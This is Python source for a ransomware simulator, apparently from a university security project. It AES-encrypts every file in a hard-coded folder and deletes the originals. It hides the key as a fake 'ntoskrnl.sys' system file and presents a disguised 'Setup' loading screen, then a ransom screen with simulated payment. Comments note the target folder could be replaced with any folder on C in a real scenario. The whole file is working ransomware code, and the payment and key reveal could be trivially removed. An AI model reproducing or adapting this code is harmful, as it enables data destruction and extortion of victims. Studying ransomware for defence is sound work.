import os
import base64
import threading
import hashlib
import time
from pathlib import Path
from tkinter import *
from tkinter import messagebox
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# === HARD-CODED paths ===
TARGET_FOLDER = r"E:/university/Security/project/Ransomware-Anti-Ransomware/Ransomware/populated" #in real scenario replace with any folder in C
KEY_STORAGE_FOLDER = r"E:/university/Security/project/Ransomware-Anti-Ransomware/Ransomware/keystorage" #in real scenario replace with any folder in C
KEY_FILE = "ntoskrnl.sys"  # disguises as system file
EXT = ".enc"

# === Crypto Functions ===
def generate_key():
    key = os.urandom(32)
    nonce = os.urandom(16)
    return key, nonce

def store_key(hidden_dir, key, nonce):
    os.makedirs(hidden_dir, exist_ok=True)
    full_path = os.path.join(hidden_dir, KEY_FILE)
    with open(full_path, "wb") as f:
        f.write(base64.b64encode(key + nonce))
    os.system(f'attrib +h +s "{full_path}"')

def load_key(base_path):
    try:
        full_path = os.path.join(base_path, KEY_FILE)
        with open(full_path, "rb") as f:
            data = f.read().decode()
        os.remove(full_path)  # Delete the key file after loading
        return data
    except FileNotFoundError:
        return None

def process_file(filepath, key, nonce, encrypt=True):
    with open(filepath, "rb") as f:
        data = f.read()

    cipher = Cipher(algorithms.AES(key), modes.CTR(nonce), backend=default_backend())
    processor = cipher.encryptor() if encrypt else cipher.decryptor()
    processed_data = processor.update(data) + processor.finalize()

    if encrypt:
        new_path = filepath + EXT
        with open(new_path, "wb") as f:
            f.write(processed_data)
        os.remove(filepath)
    else:
        orig_path = filepath[:-len(EXT)]
        with open(orig_path, "wb") as f:
            f.write(processed_data)
        os.remove(filepath)

def walk_and_process(base_path, key, nonce, encrypt=True):
    for root, _, files in os.walk(base_path):
        for name in files:
            full_path = os.path.join(root, name)
            if encrypt and not name.endswith(EXT) and name != KEY_FILE:
                process_file(full_path, key, nonce, True)
            elif not encrypt and name.endswith(EXT):
                process_file(full_path, key, nonce, False)

def hash_folder(folder_path):
    sha256 = hashlib.sha256()
    for root, _, files in sorted(os.walk(folder_path)):
        for file in sorted(files):
            file_path = os.path.join(root, file)
            rel_path = os.path.relpath(file_path, folder_path).encode()
            sha256.update(rel_path)
            with open(file_path, 'rb') as f:
                while chunk := f.read(8192):
                    sha256.update(chunk)
    return sha256.hexdigest()

# === GUI Functions ===
class RansomwareGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Setup")
        self.root.geometry("800x600")
        self.root.configure(bg="#ADD8E6")
        self.root.config(cursor="watch")
        self.anim_job = None

        self.original_hash = None
        self.encryption_start_time = None
        self.decryption_start_time = None

        self.add_loading_circle()
        self.encrypt_thread = threading.Thread(target=self.encrypt_files)
        self.encrypt_thread.start()

    def add_loading_circle(self):
        self.canvas = Canvas(self.root, width=100, height=100, bg="#ADD8E6", highlightthickness=0)
        self.canvas.place(relx=0.5, rely=0.4, anchor="center")
        self.arc = self.canvas.create_arc(10, 10, 90, 90, start=0, extent=90, outline="black", width=5, style="arc")

        self.loading_label = Label(self.root, text="Loading...", bg="#ADD8E6", fg="black", font=("Arial", 14))
        self.loading_label.place(relx=0.5, rely=0.55, anchor="center")

        self.angle = 0
        self.animate_loading()

    def animate_loading(self):
        if self.canvas.winfo_exists():
            self.angle = (self.angle + 10) % 360
            self.canvas.itemconfig(self.arc, start=self.angle)
            self.anim_job = self.root.after(50, self.animate_loading)

    def encrypt_files(self):
        self.original_hash = hash_folder(TARGET_FOLDER)
        print("\n📦 Original folder hash:", self.original_hash)

        self.encryption_start_time = time.time()

        key, nonce = generate_key()
        store_key(KEY_STORAGE_FOLDER, key, nonce)
        walk_and_process(TARGET_FOLDER, key, nonce, encrypt=True)

        duration = time.time() - self.encryption_start_time
        print(f"🔐 Encryption completed in {duration:.2f} seconds.")

        self.root.after(1000, self.show_ransom_screen)

    def show_ransom_screen(self):
        self.clear_screen()
        self.root.configure(bg="red")
        self.root.config(cursor="arrow")

        ransom_msg = Label(
            self.root,
            text=f"YOUR FILES FOLDER ARE ENCRYPTED!!\nLocation:{TARGET_FOLDER}\nClick below to simulate payment.",
            bg="red", fg="white", font=("Arial", 14), justify="center"
        )
        ransom_msg.pack(pady=30)

        Button(self.root, text="Simulate Payment", font=("Arial", 12), command=self.reveal_key).pack(pady=20)

    def reveal_key(self):
        self.clear_screen()
        self.root.configure(bg="black")

        Label(self.root, text="Payment Accepted!", fg="green", bg="black", font=("Arial", 16)).pack(pady=10)
        Label(self.root, text="Here is your decryption key (copy it):", fg="white", bg="black", font=("Arial", 12)).pack()

        key_display = Text(self.root, height=2, width=60, bg="gray", fg="white", font=("Consolas", 10))
        key_display.pack()
        key_display.insert(END, load_key(KEY_STORAGE_FOLDER))

        Label(self.root, text="Paste the key below to start decryption:", fg="white", bg="black", font=("Arial", 12)).pack(pady=10)
        self.user_entry = Entry(self.root, width=60)
        self.user_entry.pack()

        Button(self.root, text="Decrypt Files", font=("Arial", 12), command=self.decrypt_files).pack(pady=10)

    def decrypt_files(self):
        key_input = self.user_entry.get().strip()
        self.decryption_start_time = time.time()

        # Show wait message
        self.status_label = Label(self.root, text="⏳ Please wait while decrypting...", fg="yellow", bg="black", font=("Arial", 12))
        self.status_label.pack(pady=10)

        self.root.update()  # force GUI update

        try:
            data = base64.b64decode(key_input)
            key, nonce = data[:32], data[32:]
            walk_and_process(TARGET_FOLDER, key, nonce, encrypt=False)

            duration = time.time() - self.decryption_start_time
            print(f"🔓 Decryption completed in {duration:.2f} seconds.")

            final_hash = hash_folder(TARGET_FOLDER)
            print("📦 Final folder hash:", final_hash)

            if final_hash == self.original_hash:
                print("✅ Folder integrity verified.")
            else:
                print("❌ Folder integrity check failed.")

            self.status_label.config(text="✅ Files successfully decrypted!", fg="lightgreen")
            messagebox.showinfo("Success", "✅ Your files have been decrypted.")
            self.root.after(1500, self.root.destroy)  # auto close after 1.5 sec

        except Exception as e:
            self.status_label.config(text="❌ Decryption failed.", fg="red")
            messagebox.showerror("Error", f"❌ Decryption failed.\n{e}")

    def clear_screen(self):
        if self.anim_job:
            self.root.after_cancel(self.anim_job)
            self.anim_job = None
        for widget in self.root.winfo_children():
            widget.destroy()

# === Start GUI ===
if __name__ == "__main__":
    root = Tk()
    app = RansomwareGUI(root)
    root.mainloop()
